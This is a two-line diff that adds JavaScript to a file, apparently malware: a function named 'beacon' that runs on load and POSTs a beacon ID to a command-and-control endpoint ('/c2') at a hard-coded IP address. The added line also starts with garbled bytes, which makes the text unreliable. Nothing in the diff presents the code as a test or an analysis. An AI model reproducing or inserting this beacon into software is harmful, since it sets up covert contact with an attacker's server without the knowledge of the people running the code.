@@ -1,0 +1,2 @@
+zö¥jÚfunction beacon(){var xhr=new XMLHttpRequest();xhr.open('POST','http://198.51.100.30/c2',false);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('beacon_id=abc123');}
+beacon();
